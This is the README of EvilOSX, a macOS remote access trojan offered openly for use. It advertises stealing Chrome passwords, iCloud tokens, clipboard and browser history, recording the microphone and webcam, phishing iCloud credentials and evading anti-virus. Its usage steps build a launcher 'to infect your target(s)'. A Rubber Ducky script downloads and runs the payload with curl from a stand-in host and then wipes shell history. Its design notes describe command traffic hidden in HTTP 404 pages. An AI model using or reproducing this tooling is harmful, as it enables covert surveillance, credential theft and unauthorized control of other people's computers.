<h1 align="center">
  <br>
  <a href="https://github.com/Marten4n6/EvilOSX"><img src="/data/images/logo.png?raw=true" alt="EvilOSX" width="280"></a>
  <br>
  EvilOSX
  <br>
</h1>

<h4 align="center">An evil RAT (Remote Administration Tool) for macOS / OS X.</h4>

<p align="center">
  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt">
      <img src="https://img.shields.io/badge/license-GPLv3-blue.svg?style=flat-square">
  </a>
  <a href="https://github.com/Marten4n6/EvilOSX/issues">
    <img src="https://img.shields.io/github/issues/Marten4n6/EvilOSX.svg?style=flat-square">
  </a>
  <a href="https://github.com/Marten4n6/EvilOSX/blob/master/CONTRIBUTING.md">
      <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat-square">
  </a>
</p>

---

## Features
- Emulate a terminal instance
- Simple extendable [module](https://github.com/Marten4n6/EvilOSX/blob/master/CONTRIBUTING.md) system
- No bot dependencies (pure python)
- Undetected by anti-virus (OpenSSL [AES-256](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) encrypted payloads)
- Persistent
- Retrieve Chrome passwords
- Retrieve iCloud tokens and contacts
- Retrieve/monitor the clipboard
- Retrieve browser history (Chrome and Safari)
- [Phish](https://i.imgur.com/x3ilHQi.png) for iCloud passwords via iTunes
- iTunes (iOS) backup enumeration
- Record the microphone
- Take a desktop screenshot or picture using the webcam
- Attempt to get root via local privilege escalation

## How To Use
The **server** side requires [python3](https://www.python.org/downloads) to run. <br/>
The **bot** side is written in python2 which is already installed on macOS / OS X. <br/><br/>
Once python3 is installed, open a terminal and type the following:

```bash
# Clone or download this repository
$ git clone https://github.com/Marten4n6/EvilOSX

# Go into the repository
$ cd EvilOSX

# Install dependencies required by the server
$ sudo pip3 install -r requirements.txt

# Build a launcher to infect your target(s)
$ python3 builder.py

# Start listening for connections
$ python3 start.py

# Lastly, run the built launcher on your target
```
**Because payloads are created unique to the target system (automatically by the server), the server must be running when any bot connects for the first time.**

## Screenshots
![](https://i.imgur.com/BE24YPB.png)
![](https://i.imgur.com/SpDPOUv.png)

## Motivation
This project was created to be used with my [Rubber Ducky](https://hakshop.com/products/usb-rubber-ducky-deluxe), here's the simple script:
```
REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
REM See also: https://ducktoolkit.com/vidpid/

DELAY 1000
GUI SPACE
DELAY 500
STRING Termina
DELAY 1000
ENTER
DELAY 1500

REM Kill all terminals after x seconds
STRING screen -dm bash -c 'sleep 6; killall Terminal'
ENTER

STRING cd /tmp; curl -s HOST_TO_EVILOSX.py -o 1337.py; python 1337.py; history -cw; clear
ENTER
```
- It takes about 10 seconds to backdoor any unlocked Mac, which is...... *nice*
- Termina**l** is spelt that way intentionally, on some systems spotlight won't find the terminal otherwise. <br/>
- To bypass the keyboard setup assistant make sure you change the VID&PID which can be found [here](https://ducktoolkit.com/vidpid/). Aluminum Keyboard (ISO) is probably the one you are looking for.


## Versioning
EvilOSX will be maintained under the Semantic Versioning guidelines as much as possible. <br/>
Server and bot releases will be numbered with the follow format:
```
<major>.<minor>.<patch>
```

And constructed with the following guidelines:
- Breaking backward compatibility bumps the major
- New additions without breaking backward compatibility bumps the minor
- Bug fixes and misc changes bump the patch

For more information on SemVer, please visit https://semver.org/.

## Design Notes
- The server uses the [MVC](https://en.wikipedia.org/wiki/Model-view-controller) pattern
- Infecting a machine is split up into three parts:
  * A **launcher** is run on the target machine whose only goal is to run the stager
  * The stager asks the server for a **loader** which handles how a payload will be loaded
  * The loader is given a uniquely encrypted **payload** and then sent back to the stager
- The server hides it's communications by sending messages hidden in HTTP 404 error pages (from BlackHat's "Hiding In Plain Sight")
  * Command requests are retrieved from the server via a GET request
  * Command responses are sent to the server via a POST request
- Modules take advantage of python's dynamic nature, they are simply sent over the network compressed with [zlib](https://www.zlib.net), along with any configuration options
- Since the bot only communicates with the server and never the other way around, the server has no way of knowing when a bot goes offline

## Issues
Feel free to submit any issues or feature requests [here](https://github.com/Marten4n6/EvilOSX/issues).

## Credits
- The awesome [Empire](https://github.com/EmpireProject) project
- Shoutout to [Patrick Wardle](https://twitter.com/patrickwardle) for his awesome talks, check out [Objective-See](https://objective-see.com/)
- [manwhoami](https://github.com/manwhoami) for his projects: [OSXChromeDecrypt](https://github.com/manwhoami/OSXChromeDecrypt), [MMeTokenDecrypt](https://github.com/manwhoami/MMeTokenDecrypt), [iCloudContacts](https://github.com/manwhoami/iCloudContacts)
- The slowloris module is pretty much copied from [PySlowLoris](https://github.com/ProjectMayhem/PySlowLoris)
- [urwid](http://urwid.org/) and [this code](https://github.com/izderadicka/xmpp-tester/blob/master/commander.py) which saved me a lot of time with the GUI
- Logo created by [motusora](https://www.behance.net/motusora)

## License
[GPLv3](https://github.com/Marten4n6/EvilOSX/blob/master/LICENSE.txt)
